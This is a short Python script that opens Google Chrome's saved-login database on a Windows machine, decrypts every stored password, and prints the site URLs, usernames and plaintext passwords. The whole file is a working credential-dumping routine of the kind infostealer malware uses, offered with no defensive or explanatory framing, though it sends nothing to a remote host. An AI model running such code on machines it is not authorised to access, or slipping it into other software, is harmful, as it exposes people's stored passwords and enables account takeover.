import os
import sys
import sqlite3
from windows_cryptography import decrypt_password as decrypt
import binascii


if os.name != 'nt':
    sys.exit('ERROR: Must be using a Windows machine')

folder = os.getenv('LOCALAPPDATA') + r'\Google\Chrome\User Data\Default'
if not os.path.isdir(folder):
    sys.exit("ERROR: Could not find Chrome.")

connection = sqlite3.connect(folder + '\Login Data')
c = connection.cursor()
# Blacklisted_by_user = 0 will filter out the sites where passwords are never remembered.
c.execute('SELECT action_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0')
query_results = c.fetchall()

results = []
for entry in query_results:
    #print(entry[2])
    password = decrypt(entry[2])
    if password:
        results.append((entry[0], entry[1], password[0][:password[1]].decode("UTF-8")))
print(results)